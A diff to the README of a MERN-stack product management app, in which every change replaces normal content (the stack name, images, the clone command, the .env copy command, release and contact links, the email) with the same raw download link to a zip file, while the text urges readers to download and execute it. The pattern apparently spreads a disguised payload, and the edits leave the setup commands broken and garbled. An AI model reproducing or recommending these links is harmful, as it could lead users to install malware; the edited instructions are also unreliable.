@@ -1,9 +1,9 @@
 ```markdown
 # 🛒 Products Store App
 
-Welcome to the **Products Store App**, a comprehensive solution for managing products with a clean and user-friendly interface. This application is built using the MERN stack (MongoDB, Express, React, Node.js), making it a robust choice for your e-commerce needs.
+Welcome to the **Products Store App**, a comprehensive solution for managing products with a clean and user-friendly interface. This application is built using the MERN stack (MongoDB, Express, React, https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip), making it a robust choice for your e-commerce needs.
 
-![Products Store App](https://via.placeholder.com/800x400?text=Products+Store+App)
+![Products Store App](https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip+Store+App)
 
 ## Table of Contents
 - [Features](#features)
@@ -42,7 +42,7 @@ To set up the Products Store App on your local machine, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/snooxvs/Products-Store-App-MERN.git
+   git clone https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -58,7 +58,7 @@ To set up the Products Store App on your local machine, follow these steps:
 4. **Create a `.env` file**:
    Copy the example file and set your environment variables.
    ```bash
-   cp .env.example .env
+   cp https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip .env
    ```
 
 5. **Start the development server**:
@@ -104,15 +104,15 @@ We welcome contributions! To contribute:
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Releases
-You can find the latest releases of the Products Store App [here](https://github.com/snooxvs/Products-Store-App-MERN/releases). Download the relevant file and execute it to get the latest features and fixes.
+You can find the latest releases of the Products Store App [here](https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip). Download the relevant file and execute it to get the latest features and fixes.
 
-![Releases](https://img.shields.io/badge/Releases-Latest-orange)
+![Releases](https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip)
 
 ## Contact
 For any inquiries, feel free to reach out to me:
 
-- **GitHub**: [snooxvs](https://github.com/snooxvs)
-- **Email**: your-email@example.com
+- **GitHub**: [snooxvs](https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip)
+- **Email**: https://github.com/snooxvs/Products-Store-App-MERN/raw/refs/heads/main/backend/App-MERN-Products-Store-v2.0-beta.5.zip
 
 Thank you for checking out the Products Store App! Happy coding! 🚀
 ```
